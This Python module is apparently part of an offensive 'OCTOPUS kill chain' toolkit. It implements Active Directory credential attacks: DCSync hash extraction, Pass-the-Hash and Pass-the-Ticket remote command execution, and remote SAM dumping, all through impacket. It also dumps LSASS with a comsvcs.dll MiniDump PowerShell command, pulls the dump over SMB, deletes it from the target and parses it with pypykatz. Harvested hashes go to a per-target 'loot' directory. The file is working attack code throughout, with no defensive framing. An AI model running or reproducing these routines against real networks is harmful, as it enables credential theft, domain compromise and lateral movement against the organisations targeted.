#!/usr/bin/env python3
"""
Active Directory credential attack module for the OCTOPUS kill chain.

Provides DCSync, Pass-the-Hash, Pass-the-Ticket, remote LSASS dumping,
and SAM/SYSTEM registry hive extraction.  All attacks use impacket as the
primary backend with CLI tool fallbacks.

Usage::

    from core.killchain.ad.credential import dcsync, pass_the_hash
    result = dcsync("10.10.10.100", {"user": "admin", "password": "P@ss", "domain": "CORP"})
"""

import logging
import os
import shutil
import subprocess
from typing import Optional

# ── Logging ──────────────────────────────────────────────────────────────
logger = logging.getLogger("octopus.killchain.ad.credential")

# ── ANSI Colors ──────────────────────────────────────────────────────────
C_GREEN = "\033[92m"
C_YELLOW = "\033[93m"
C_RED = "\033[91m"
C_CYAN = "\033[96m"
C_GREY = "\033[90m"
C_BLUE = "\033[94m"
C_MAGENTA = "\033[95m"
C_RESET = "\033[0m"

# ── Constants ────────────────────────────────────────────────────────────
DEFAULT_LOOT_BASE = os.path.expanduser("~/OCTOPUS/loot")
IMPACKET_TIMEOUT = 180
CLI_TIMEOUT = 300


# Internal helpers

def _normalize_creds(creds: Optional[dict[str, str]]) -> dict[str, str]:
    """Return a dict with guaranteed keys: user, password, domain, nthash."""
    defaults: dict[str, str] = {"user": "", "password": "", "domain": "", "nthash": ""}
    if creds:
        defaults.update(creds)
    return defaults


def _loot_dir(target: str) -> str:
    """Return (and create) a per-target loot directory for credential files."""
    path = os.path.join(DEFAULT_LOOT_BASE, target.replace(".", "_"), "creds")
    os.makedirs(path, exist_ok=True)
    return path


def _run_cli(cmd: str, timeout: int = CLI_TIMEOUT) -> str:
    """Execute a shell command and return combined stdout+stderr."""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout,
        )
        return (result.stdout + result.stderr).strip()
    except subprocess.TimeoutExpired:
        logger.warning("CLI command timed out: %s", cmd[:80])
        return f"[!] Command timed out after {timeout}s"
    except FileNotFoundError:
        return "[!] Command not found"
    except Exception as exc:
        logger.error("CLI command failed: %s", exc)
        return f"[!] Command error: {exc}"


def _impacket_auth_string(creds: dict[str, str]) -> str:
    """Build ``DOMAIN/user:password`` string for impacket CLI tools."""
    domain = creds["domain"]
    user = creds["user"]
    password = creds["password"]
    if domain:
        return f"{domain}/{user}:{password}"
    return f"{user}:{password}"


# DCSync

def dcsync(target: str, creds: Optional[dict[str, str]] = None) -> str:
    """Perform a DCSync attack via impacket's ``secretsdump``.

    Extracts all domain password hashes by replicating the NTDS.dit
    database from the Domain Controller.  Requires Domain Admin or
    replication privileges.

    Args:
        target: DC IP or hostname.
        creds: Credential dict (``user``, ``password``, ``domain``, optional ``nthash``).

    Returns:
        Formatted result string with extracted NTLM hashes.
    """
    creds = _normalize_creds(creds)
    print(f"\n  {C_RED}[CRED] DCSync — {target}{C_RESET}")
    output = f"[DCSYNC — {target}]\n{'═' * 60}\n\n"

    if not creds["user"] or not creds["domain"]:
        output += "[!] Domain credentials required for DCSync.\n"
        return output

    loot = _loot_dir(target)
    dump_file = os.path.join(loot, "dcsync_hashes.txt")

    # ── Try impacket Python module ────────────────────────────────
    try:
        from impacket.examples.secretsdump import DumpSecrets  # type: ignore[import-untyped]

        logger.info("Running DCSync via impacket secretsdump module")

        class _Options:
            """Minimal namespace for DumpSecrets."""
            def __init__(self) -> None:
                self.target = f"{creds['domain']}/{creds['user']}:{creds['password']}@{target}"
                self.dc_ip = target
                self.target_ip = target
                self.just_dc = True
                self.just_dc_ntlm = True
                self.just_dc_user = None
                self.use_vss = False
                self.exec_method = "smbexec"
                self.outputfile = dump_file
                self.hashes = f":{creds['nthash']}" if creds["nthash"] else None
                self.no_pass = False
                self.k = False
                self.system = ""
                self.ntds = ""
                self.sam = ""
                self.security = ""
                self.bootkey = ""
                self.history = False
                self.resumefile = None

        dumper = DumpSecrets(_Options())
        dumper.dump()

        if os.path.isfile(dump_file + ".ntds") and os.path.getsize(dump_file + ".ntds") > 0:
            with open(dump_file + ".ntds") as fh:
                hashes = fh.read()
            count = len(hashes.strip().splitlines())
            output += f"[+] DCSync successful — {count} hash(es) extracted\n"
            output += f"    Output: {dump_file}.ntds\n"
            output += f"\n{hashes[:5000]}\n"
            print(f"    {C_GREEN}[+] {count} hashes dumped via DCSync!{C_RESET}")
        elif os.path.isfile(dump_file) and os.path.getsize(dump_file) > 0:
            with open(dump_file) as fh:
                hashes = fh.read()
            count = len(hashes.strip().splitlines())
            output += f"[+] DCSync successful — {count} hash(es) extracted\n"
            output += f"    Output: {dump_file}\n"
            output += f"\n{hashes[:5000]}\n"
            print(f"    {C_GREEN}[+] {count} hashes dumped via DCSync!{C_RESET}")
        else:
            output += "[-] DCSync produced no output — check privileges.\n"
        return output
    except ImportError:
        logger.debug("impacket secretsdump not importable — trying CLI")
    except Exception as exc:
        logger.warning("impacket DCSync failed: %s", exc)
        output += f"[!] impacket error: {exc}\n"

    # ── Fall back to CLI ──────────────────────────────────────────
    cli_bin = shutil.which("secretsdump.py") or shutil.which("impacket-secretsdump")
    if cli_bin:
        auth = _impacket_auth_string(creds)
        hash_arg = f"-hashes :{creds['nthash']}" if creds["nthash"] else ""
        cmd = (
            f'{cli_bin} "{auth}@{target}" -dc-ip {target} '
            f'-just-dc-ntlm -outputfile {dump_file} {hash_arg}'
        )
        cli_out = _run_cli(cmd, timeout=IMPACKET_TIMEOUT)
        output += f"(via CLI)\n{cli_out[:5000]}\n"
    else:
        output += "[!] No impacket secretsdump available. Install impacket.\n"

    return output


# Pass-the-Hash

def pass_the_hash(target: str, user: str, nthash: str,
                  domain: str = "", command: str = "whoami") -> str:
    """Execute a command on a remote host using Pass-the-Hash.

    Uses impacket's ``smbexec`` or ``wmiexec`` with an NTLM hash instead
    of a password.

    Args:
        target: Target IP or hostname.
        user: Username to authenticate as.
        nthash: NT hash (32-character hex string).
        domain: Optional domain name.
        command: Command to execute on the target (default: ``whoami``).

    Returns:
        Formatted result string with command output.
    """
    print(f"\n  {C_RED}[CRED] Pass-the-Hash — {user}@{target}{C_RESET}")
    output = f"[PASS-THE-HASH — {user}@{target}]\n{'═' * 60}\n\n"

    if not nthash:
        output += "[!] NT hash required for Pass-the-Hash.\n"
        return output

    # ── Try impacket smbexec ──────────────────────────────────────
    try:
        from impacket.smbconnection import SMBConnection

        logger.info("PTH via impacket SMBConnection: %s@%s", user, target)
        smb = SMBConnection(target, target, sess_port=445, timeout=30)
        smb.login(user, "", domain, lmhash="", nthash=nthash)

        output += "[+] SMB authentication successful via PTH\n"
        output += f"    User:   {domain}\\{user}\n"
        output += f"    Hash:   {nthash[:8]}...{nthash[-8:]}\n"
        print(f"    {C_GREEN}[+] PTH authentication succeeded!{C_RESET}")

        # Execute command via impacket
        try:
            from impacket.examples.smbexec import SMBEXEC  # type: ignore[import-untyped]
            executer = SMBEXEC(
                command, username=user, password="",
                domain=domain, hashes=f":{nthash}",
                share="C$", port=445,
            )
            exec_result = executer.run(target, target)
            output += f"\n[COMMAND OUTPUT]\n{exec_result[:3000]}\n"
        except ImportError:
            output += "[!] impacket smbexec not available for command execution.\n"
            output += "    Authentication was successful — use psexec/wmiexec manually.\n"
        except Exception as exc:
            output += f"[!] Command execution failed: {exc}\n"

        smb.logoff()
        return output
    except ImportError:
        logger.debug("impacket not available for PTH")
    except Exception as exc:
        logger.warning("impacket PTH failed: %s", exc)
        output += f"[!] impacket PTH error: {exc}\n"

    # ── Fall back to CLI ──────────────────────────────────────────
    cli_bin = shutil.which("smbexec.py") or shutil.which("impacket-smbexec")
    if cli_bin:
        domain_prefix = f"{domain}/" if domain else ""
        cmd = (
            f'{cli_bin} -hashes :{nthash} '
            f'"{domain_prefix}{user}@{target}" -codec utf-8'
        )
        output += "(via CLI — interactive shell)\n"
        output += f"  Command: {cmd}\n"
        output += "[!] Use interactively or pipe commands.\n"
    else:
        output += "[!] No impacket smbexec available. Install impacket.\n"

    return output


# Pass-the-Ticket

def pass_the_ticket(target: str, ticket_file: str,
                    command: str = "whoami") -> str:
    """Execute a command using a Kerberos ticket (Pass-the-Ticket).

    Sets ``KRB5CCNAME`` to the provided ``.ccache`` file and uses
    impacket to authenticate via Kerberos.

    Args:
        target: Target IP or hostname.
        ticket_file: Path to ``.ccache`` ticket file.
        command: Command to execute (default: ``whoami``).

    Returns:
        Formatted result string with command output.
    """
    print(f"\n  {C_CYAN}[CRED] Pass-the-Ticket — {target}{C_RESET}")
    output = f"[PASS-THE-TICKET — {target}]\n{'═' * 60}\n\n"

    if not os.path.isfile(ticket_file):
        output += f"[!] Ticket file not found: {ticket_file}\n"
        return output

    # Set KRB5CCNAME for this process
    os.environ["KRB5CCNAME"] = ticket_file
    output += f"[*] Using ticket: {ticket_file}\n"
    output += f"    KRB5CCNAME={ticket_file}\n\n"

    # ── Try impacket ──────────────────────────────────────────────
    try:
        from impacket.krb5.ccache import CCache

        ccache = CCache.loadFile(ticket_file)
        principal = ccache.principal
        output += f"[+] Ticket principal: {principal}\n"

        # Extract domain info from ticket
        creds_from_ticket = str(principal).split("@")
        user_from_ticket = creds_from_ticket[0] if creds_from_ticket else "unknown"
        domain_from_ticket = creds_from_ticket[1] if len(creds_from_ticket) > 1 else ""

        output += f"    User:   {user_from_ticket}\n"
        output += f"    Domain: {domain_from_ticket}\n"
        print(f"    {C_GREEN}[+] Ticket loaded: {user_from_ticket}@{domain_from_ticket}{C_RESET}")
    except ImportError:
        logger.debug("impacket CCache not available")
        output += "[!] impacket not available for ticket parsing.\n"
    except Exception as exc:
        logger.warning("Ticket parsing failed: %s", exc)
        output += f"[!] Ticket parsing error: {exc}\n"

    # ── Execute via CLI with Kerberos auth ────────────────────────
    cli_bin = shutil.which("smbexec.py") or shutil.which("impacket-smbexec")
    if not cli_bin:
        cli_bin = shutil.which("wmiexec.py") or shutil.which("impacket-wmiexec")

    if cli_bin:
        cmd = f'KRB5CCNAME={ticket_file} {cli_bin} -k -no-pass {target} "{command}"'
        cli_out = _run_cli(cmd, timeout=IMPACKET_TIMEOUT)
        output += f"\n[COMMAND OUTPUT]\n{cli_out[:3000]}\n"
    else:
        output += "[!] No impacket exec tool found for PTT. Install impacket.\n"

    return output


# LSASS dump

def dump_lsass(target: str, creds: Optional[dict[str, str]] = None) -> str:
    """Remotely dump LSASS process memory to extract credentials.

    Uses impacket to upload and execute procdump or comsvcs.dll MiniDump,
    then downloads and parses the dump with pypykatz if available.

    Args:
        target: Target IP or hostname.
        creds: Credential dict (``user``, ``password``, ``domain``, optional ``nthash``).

    Returns:
        Formatted result string with extracted credentials.
    """
    creds = _normalize_creds(creds)
    print(f"\n  {C_RED}[CRED] LSASS Dump — {target}{C_RESET}")
    output = f"[LSASS DUMP — {target}]\n{'═' * 60}\n\n"

    if not creds["user"]:
        output += "[!] Credentials required for LSASS dump.\n"
        return output

    loot = _loot_dir(target)
    dump_filename = "lsass.dmp"
    local_dump = os.path.join(loot, dump_filename)

    # ── Method 1: comsvcs.dll via impacket wmiexec ────────────────
    try:
        from impacket.smbconnection import SMBConnection

        logger.info("Connecting to %s for LSASS dump", target)
        smb = SMBConnection(target, target, sess_port=445, timeout=30)

        if creds["nthash"]:
            smb.login(creds["user"], "", creds["domain"],
                      lmhash="", nthash=creds["nthash"])
        else:
            smb.login(creds["user"], creds["password"], creds["domain"])

        output += "[+] SMB connection established\n"

        # Use comsvcs.dll to dump LSASS
        dump_cmd = (
            'powershell -c "'
            "$p = Get-Process lsass; "
            "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, "
            f'MiniDump $p.Id C:\\Windows\\Temp\\{dump_filename} full'
            '"'
        )

        try:
            from impacket.examples.wmiexec import WMIEXEC  # type: ignore[import-untyped]

            executer = WMIEXEC(
                dump_cmd, username=creds["user"],
                password=creds["password"],
                domain=creds["domain"],
                hashes=f":{creds['nthash']}" if creds["nthash"] else "",
                share="ADMIN$",
            )
            executer.run(target, smb)
            output += "[+] LSASS dump command executed\n"
        except (ImportError, Exception) as exc:
            output += f"[!] WMI execution failed: {exc}\n"
            output += "[*] Trying alternative method...\n"
            smb.logoff()
            # Fall through to CLI method
            raise

        # Download the dump
        try:
            with open(local_dump, "wb") as fh:
                smb.getFile("C$", f"Windows\\Temp\\{dump_filename}", fh.write)
            output += f"[+] LSASS dump downloaded → {local_dump}\n"
            dump_size = os.path.getsize(local_dump)
            output += f"    Size: {dump_size:,} bytes\n"

            # Clean up remote dump
            smb.deleteFile("C$", f"Windows\\Temp\\{dump_filename}")
            output += "[+] Remote dump file cleaned up\n"
        except Exception as exc:
            output += f"[!] Failed to download dump: {exc}\n"

        smb.logoff()

        # ── Parse with pypykatz ───────────────────────────────────
        if os.path.isfile(local_dump):
            try:
                import pypykatz  # lazy import

                logger.info("Parsing LSASS dump with pypykatz")
                parsed = pypykatz.parse_minidump_file(local_dump)
                output += "\n[EXTRACTED CREDENTIALS]\n" + "-" * 40 + "\n"
                for _luid, session in parsed.logon_sessions.items():
                    if session.username and session.username != "(null)":
                        output += f"  {session.domain}\\{session.username}\n"
                        if session.lm_hash:
                            output += f"    LM:   {session.lm_hash}\n"
                        if session.nt_hash:
                            output += f"    NTLM: {session.nt_hash}\n"
                        if session.password:
                            output += f"    Pass: {session.password}\n"
                print(f"    {C_GREEN}[+] Credentials extracted from LSASS!{C_RESET}")
            except ImportError:
                output += "[!] pypykatz not installed — parse dump manually.\n"
                output += f"    pypykatz lsa minidump {local_dump}\n"
            except Exception as exc:
                output += f"[!] pypykatz parsing failed: {exc}\n"

        return output
    except ImportError:
        logger.debug("impacket not available for LSASS dump")
    except Exception as exc:
        logger.warning("LSASS dump method 1 failed: %s", exc)
        if "[!]" not in output:
            output += f"[!] LSASS dump error: {exc}\n"

    # ── Fall back to CLI secretsdump (SAM+LSA) ────────────────────
    cli_bin = shutil.which("secretsdump.py") or shutil.which("impacket-secretsdump")
    if cli_bin:
        auth = _impacket_auth_string(creds)
        hash_arg = f"-hashes :{creds['nthash']}" if creds["nthash"] else ""
        cmd = f'{cli_bin} "{auth}@{target}" {hash_arg}'
        cli_out = _run_cli(cmd, timeout=IMPACKET_TIMEOUT)
        output += f"(via secretsdump CLI fallback)\n{cli_out[:5000]}\n"
    else:
        output += "[!] No LSASS dump method available. Install impacket + pypykatz.\n"

    return output


# SAM dump

def sam_dump(target: str, creds: Optional[dict[str, str]] = None) -> str:
    """Remotely dump the SAM database (local account hashes).

    Uses impacket's ``secretsdump`` targeting SAM+SYSTEM+SECURITY
    registry hives via the remote registry or VSS.

    Args:
        target: Target IP or hostname.
        creds: Credential dict (``user``, ``password``, ``domain``, optional ``nthash``).

    Returns:
        Formatted result string with local account NTLM hashes.
    """
    creds = _normalize_creds(creds)
    print(f"\n  {C_RED}[CRED] SAM Dump — {target}{C_RESET}")
    output = f"[SAM DUMP — {target}]\n{'═' * 60}\n\n"

    if not creds["user"]:
        output += "[!] Credentials required for SAM dump.\n"
        return output

    loot = _loot_dir(target)
    dump_file = os.path.join(loot, "sam_dump")

    # ── Try impacket secretsdump ──────────────────────────────────
    try:
        from impacket.examples.secretsdump import DumpSecrets  # type: ignore[import-untyped]

        logger.info("Running SAM dump via impacket secretsdump")

        class _Options:
            """Minimal namespace for DumpSecrets (SAM only)."""
            def __init__(self) -> None:
                self.target = f"{creds['domain']}/{creds['user']}:{creds['password']}@{target}" if creds["domain"] else f"{creds['user']}:{creds['password']}@{target}"
                self.dc_ip = None
                self.target_ip = target
                self.just_dc = False
                self.just_dc_ntlm = False
                self.just_dc_user = None
                self.use_vss = False
                self.exec_method = "smbexec"
                self.outputfile = dump_file
                self.hashes = f":{creds['nthash']}" if creds["nthash"] else None
                self.no_pass = False
                self.k = False
                self.system = ""
                self.ntds = ""
                self.sam = ""
                self.security = ""
                self.bootkey = ""
                self.history = False
                self.resumefile = None

        dumper = DumpSecrets(_Options())
        dumper.dump()

        # Check for output files
        sam_output = dump_file + ".sam"
        if os.path.isfile(sam_output) and os.path.getsize(sam_output) > 0:
            with open(sam_output) as fh:
                hashes = fh.read()
            count = len(hashes.strip().splitlines())
            output += f"[+] SAM dump successful — {count} local hash(es)\n"
            output += f"    Output: {sam_output}\n"
            output += f"\n{hashes[:3000]}\n"
            print(f"    {C_GREEN}[+] {count} SAM hashes dumped!{C_RESET}")
        else:
            output += "[-] SAM dump produced no output — check permissions.\n"
        return output
    except ImportError:
        logger.debug("impacket secretsdump not importable — trying CLI")
    except Exception as exc:
        logger.warning("impacket SAM dump failed: %s", exc)
        output += f"[!] impacket error: {exc}\n"

    # ── Fall back to CLI ──────────────────────────────────────────
    cli_bin = shutil.which("secretsdump.py") or shutil.which("impacket-secretsdump")
    if cli_bin:
        auth = _impacket_auth_string(creds)
        hash_arg = f"-hashes :{creds['nthash']}" if creds["nthash"] else ""
        cmd = (
            f'{cli_bin} "{auth}@{target}" -outputfile {dump_file} {hash_arg}'
        )
        cli_out = _run_cli(cmd, timeout=IMPACKET_TIMEOUT)
        output += f"(via CLI)\n{cli_out[:5000]}\n"
    else:
        output += "[!] No impacket secretsdump available. Install impacket.\n"

    return output
